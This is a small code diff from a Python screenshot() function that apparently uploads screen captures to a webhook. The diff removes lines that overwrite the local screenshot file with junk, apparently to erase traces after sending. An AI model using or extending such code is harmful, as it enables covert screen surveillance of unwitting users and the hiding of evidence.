@@ -20,11 +20,3 @@ def screenshot():
     response = webhook.execute()
 
     f.close()
-
-    #corrupts screenshot
-
-    f = open('screen.png', 'w')
-
-    f.write(str(10**200))
-
-    f.close()
